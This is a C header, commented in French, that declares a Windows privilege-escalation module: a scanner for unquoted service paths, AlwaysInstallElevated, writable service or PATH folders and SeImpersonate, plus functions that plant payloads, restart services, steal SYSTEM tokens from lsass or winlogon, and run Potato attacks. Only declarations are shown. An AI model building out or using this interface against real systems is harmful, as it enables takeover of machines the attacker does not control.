#ifndef PRIVESC_H
#define PRIVESC_H

#include <windows.h>
#include <winnt.h>

// Types de vulnérabilités qu'on peut détecter et exploiter
typedef enum _PRIVESC_VULN_TYPE {
  PrivEscVulnType_None = 0,
  PrivEscVulnType_UnquotedServicePath,   // Chemin de service sans guillemets
  PrivEscVulnType_AlwaysInstallElevated, // MSI s'installe en SYSTEM
  PrivEscVulnType_WritableServicePath,   // On peut écrire dans le dossier du
                                         // service
  PrivEscVulnType_WritablePATH,          // Dossier writable dans le PATH
  PrivEscVulnType_SeImpersonatePriv,     // Potato attacks possibles
  PrivEscVulnType_Count
} PRIVESC_VULN_TYPE;

// Infos sur une vuln détectée
typedef struct _PRIVESC_VULN_INFO {
  PRIVESC_VULN_TYPE Type;
  WCHAR Description[MAX_PATH * 2];
  WCHAR Path[MAX_PATH];        // Chemin binaire, MSI, ou dossier
  WCHAR ServiceName[256];      // Nom du service si applicable
  WCHAR RegistryKey[MAX_PATH]; // Clé registre si applicable
  BOOL Exploitable;            // TRUE si on peut l'exploiter auto
} PRIVESC_VULN_INFO, *PPRIVESC_VULN_INFO;

#define MAX_PRIVESC_VULNS 64

// Scan toutes les vulns connues (services, registre, PATH, tokens)
BOOL PrivEsc_ScanAll(PPRIVESC_VULN_INFO pVulnInfoArray, PDWORD pArraySize);

// Exploite un service avec chemin sans guillemets
// Place le payload au bon endroit et restart le service
BOOL PrivEsc_ExploitUnquotedPath(PPRIVESC_VULN_INFO pVulnInfo,
                                 LPCWSTR szPayloadPath);

// Exploite AlwaysInstallElevated via msiexec
BOOL PrivEsc_ExploitAlwaysInstallElevated(LPCWSTR szMsiPayloadPath);

// Vole un token SYSTEM depuis winlogon/lsass/services.exe
BOOL PrivEsc_GetSystem(void);

// Check si on a SeImpersonatePrivilege
BOOL PrivEsc_HasSeImpersonate(void);

// Récup token SYSTEM via named pipe (technique Potato)
BOOL PrivEsc_PotatoGetSystem(PHANDLE phToken);

#endif // PRIVESC_H
